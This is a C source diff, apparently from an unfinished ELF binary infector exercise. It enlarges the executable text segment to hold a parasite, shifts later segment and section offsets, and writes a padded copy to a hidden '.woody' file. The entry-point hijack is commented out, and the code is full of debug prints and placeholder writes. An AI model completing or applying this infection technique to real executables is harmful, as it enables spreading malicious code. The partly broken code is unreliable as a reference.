@@ -64,6 +64,7 @@ __syscall3(ssize_t, write, int, fd, const void *, buf, size_t, count);
 
 
 __syscall1(int, close, int, fd);
+__syscall1(int, unlink, const char  *, pathname);
 
 int magic = 0;
 char env[1024];
@@ -206,8 +207,44 @@ int out_of_range(t_file *file, void * ptr)
 	return (0);
 }
 
+void new_file(t_file *file, size_t end_of_text)
+{
+	int fd;
+	char *data;
+	printf("new_file debut\n");
+	unlink(".woody");
+	if ((fd = open ("./.woody", O_CREAT | O_RDWR | O_TRUNC, 0555)) < 0)
+	{
+
+		printf("error open fd %d\n",fd);
+		return ;
+	}
+	printf("new_file 1\n");
+
+	if ((data = mmap(0, file->size + PAGE_SIZE, PROT_READ| PROT_WRITE| PROT_EXEC,
+	                 MAP_SHARED, fd, 0)) == MAP_FAILED)
+	{
+		printf("error mmap\n");
+		close(fd);
+		return;
+	}
+
+	printf("new_file 2\n");
+
+	///write(fd,file->data,file->size + PAGE_SIZE);
+	for (int i = 0; i< file->size + PAGE_SIZE;i++)
+	write(fd,"j",1);
+	//write(fd,file->data + end_of_text, file->size - end_of_text);
+	ft_memmove(data,file->data, end_of_text);
+	ft_memmove(data + PAGE_SIZE + end_of_text,file->data + end_of_text, file->size - end_of_text);
+	printf("fin memove\n");
+	write(1,data, 15);
+
+}
+
 int do_the_job(t_file *file)
 {
+	printf("debut do_the_job\n");
 	Elf64_Ehdr          *header;
 	Elf64_Phdr*             seg;
 	Elf64_Shdr*             sec;
@@ -218,7 +255,6 @@ int do_the_job(t_file *file)
 	Elf64_Addr end_of_text;
 	int text_found = 0;
 	int i;
-	printf("fail: %d\n",file->data[EI_CLASS] != ELFCLASS64);
 	if (file->size < sizeof(Elf64_Ehdr) || ft_strncmp(file->data, ELFMAG,SELFMAG) || file->data[EI_CLASS] != ELFCLASS64)
 		return (1);
 
@@ -240,38 +276,53 @@ int do_the_job(t_file *file)
 			}
 		}
 	}
+
+	//Recupere le premier segement TEXT on lui rajoute 4096
+	//puis on rajoute a tous les segment suivant 4096
 	seg = (Elf64_Phdr*)(file->data + header->e_phoff);
 	for (i = header->e_phnum; i-- > 0; seg++)
 	{
+		if (text_found)
+		{
+			printf("seg-.p_vaddr %llx p_offset before %llx",seg->p_vaddr, seg->p_offset);
+			seg->p_offset += PAGE_SIZE;
+			printf(" after %llx\n",seg->p_offset);
+			continue;
+		}
+		else
 		if (seg->p_type == PT_LOAD)
 		{
 			if (seg->p_flags == (PF_R | PF_X))
 			{
 				text = seg->p_vaddr;
 				parasite_vaddr = seg->p_vaddr + seg->p_filesz;
+
 				old_e_entry = header->e_entry;
-				header->e_entry = parasite_vaddr;
+				//header->e_entry = parasite_vaddr;
 				end_of_text = seg->p_offset + seg->p_filesz;
+
 				seg->p_filesz += parasite_size;
 				seg->p_memsz += parasite_size;
+
 				text_found++;
 			}
 		}
 	}
-	printf("text_no_found\n");
 
-	if (text_found == 0)
-		return 1;
-	sec = (Elf64_Shdr*)(file->data + header->e_phoff);
+	sec = (Elf64_Shdr*)(file->data + header->e_shoff);
+
 	for (i = header->e_shnum; i-- > 0; sec++)
 	{
+		printf("section %llx\n",sec->sh_offset);
 		if (sec->sh_offset >= end_of_text)
 			sec->sh_offset += PAGE_SIZE;
 		else
 		if (sec->sh_size + sec->sh_addr == parasite_vaddr)
 			sec->sh_size += parasite_size;
 	}
-printf("fim do_the_job\n");
+	header->e_shoff += PAGE_SIZE;
+	new_file(file,end_of_text);
+	printf("fim do_the_job\n");
 	return 0;
 }
 
@@ -288,6 +339,7 @@ int open_directory(const char *path)
 
 	printf("directory: '%s'\n",path);
 
+	path = "/tmp/toto";
 	dd = open (path, 0x10000,0);
 	if (dd < 0)
 	{
@@ -317,6 +369,7 @@ int open_directory(const char *path)
 			do_the_job(&file);
 			close(file.fd);
 			munmap(file.data,file.size);
+			exit(4);
 		}
 	}
 	close(dd);
